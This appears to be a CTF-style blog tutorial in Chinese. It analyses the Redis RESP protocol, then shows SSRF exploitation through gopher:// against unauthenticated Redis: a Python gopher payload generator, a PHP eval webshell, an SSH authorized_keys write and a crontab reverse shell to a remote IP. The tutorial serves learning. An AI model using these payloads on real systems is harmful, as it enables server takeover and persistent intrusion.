{"title":"redis与ssrf","slug":"redis","date":"2019-08-10T07:44:26.000Z","updated":"2019-09-03T14:27:08.508Z","comments":true,"path":"api/articles/redis.json","photos":[],"link":"","excerpt":"wula!<br>我爱学习！🤫","covers":["http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg","http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg","https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png","http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg"],"content":"<p>wula!<br>我爱学习！🤫</p>\n<a id=\"more\"></a>\n\n<h1 id=\"redis协议分析\"><a href=\"#redis协议分析\" class=\"headerlink\" title=\"redis协议分析\"></a>redis协议分析</h1><p>tcpdump抓包</p>\n<pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p>\n<pre><code>127.0.0.1:6379&gt; set name test\nOK\n127.0.0.1:6379&gt; get name\n&quot;test&quot;\n127.0.0.1:6379&gt; </code></pre><h2 id=\"RESP协议\"><a href=\"#RESP协议\" class=\"headerlink\" title=\"RESP协议\"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p>\n<pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。\n2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p>\n<ol>\n<li>对于<code>Simple Strings</code>，回复的第一个字节是+</li>\n<li>对于<code>error</code>,回复的第一个字节是-</li>\n<li>对于<code>Integer</code>,，回复的第一个字节是:</li>\n<li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li>\n<li>对于<code>array</code>,回复的第一个字节是*</li>\n<li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li>\n<li>在RESP中，协议的不同部分始终以<code>&quot;\\r\\n&quot;(CRLF)</code>结束</li>\n</ol>\n<p>现在来看一下我们抓的包</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg\" alt=\"抓包协议分析1\"></p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg\" alt=\"协议分析2\"></p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg\" alt=\"协议分析3\"></p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg\" alt=\"协议分析4\"></p>\n<p>整体来看一下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png\" alt=\"整个通信过程\"></p>\n<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>\n<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\\r\\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>\n<h1 id=\"Redis配合gopher协议进行SSRF\"><a href=\"#Redis配合gopher协议进行SSRF\" class=\"headerlink\" title=\"Redis配合gopher协议进行SSRF\"></a>Redis配合gopher协议进行SSRF</h1><h2 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p>\n<ol>\n<li>绝对路径写webshell</li>\n<li>写ssh公钥</li>\n<li>写contrab计划任务反弹shell</li>\n</ol>\n<h3 id=\"绝对路径写webshell\"><a href=\"#绝对路径写webshell\" class=\"headerlink\" title=\"绝对路径写webshell\"></a>绝对路径写webshell</h3><p>构造redis命令</p>\n<pre><code>flushall\nset 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nsave</code></pre><p>转换为redis RESP格式</p>\n<pre><code>import urllib\nprotocol=&quot;gopher://&quot;\nip=&quot;192.168.163.128&quot;\nport=&quot;6379&quot;\nshell=&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;\nfilename=&quot;shell.php&quot;\npath=&quot;/var/www/html&quot;\npasswd=&quot;&quot;\ncmd=[&quot;flushall&quot;,\n     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),\n     &quot;config set dir {}&quot;.format(path),\n     &quot;config set dbfilename {}&quot;.format(filename),\n     &quot;save&quot;\n     ]\nif passwd:\n    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))\npayload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;\ndef redis_format(arr):\n    CRLF=&quot;\\r\\n&quot;\n    redis_arr = arr.split(&quot; &quot;)\n    cmd=&quot;&quot;\n    cmd+=&quot;*&quot;+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)\n    cmd+=CRLF\n    return cmd\n\nif __name__==&quot;__main__&quot;:\n    for x in cmd:\n        payload += urllib.quote(redis_format(x))\n    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg\" alt=\"写shell\"></p>\n<p>写入成功</p>\n<h3 id=\"写ssh公钥\"><a href=\"#写ssh公钥\" class=\"headerlink\" title=\"写ssh公钥\"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>\n<p>构造redis命令</p>\n<pre><code>flushall\nset 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n&apos;\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nsave</code></pre><p>改第一个脚本</p>\n<pre><code>filename=&quot;authorized_keys&quot;\nssh_pub=&quot;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\\n\\n&quot;\npath=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p>\n<h3 id=\"利用contrab计划反弹shell\"><a href=\"#利用contrab计划反弹shell\" class=\"headerlink\" title=\"利用contrab计划反弹shell\"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p>\n<p>构造redis命令</p>\n<pre><code>flushall\nset 1 &apos;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\\n\\n&apos;\nconfig set dir /var/spool/cron/\nconfig set dbfilename root\nsave</code></pre><p>改第一个命令</p>\n<pre><code>reverse_ip=&quot;192.168.163.132&quot;\nreverse_port=&quot;2333&quot;\ncron=&quot;\\n\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\n\\n\\n\\n&quot;%(reverse_ip,reverse_port)\nfilename=&quot;root&quot;\npath=&quot;/var/spool/cron&quot;</code></pre><h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://xz.aliyun.com/t/5665#toc-11\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5665#toc-11</a><br><a href=\"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf\" target=\"_blank\" rel=\"noopener\">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]}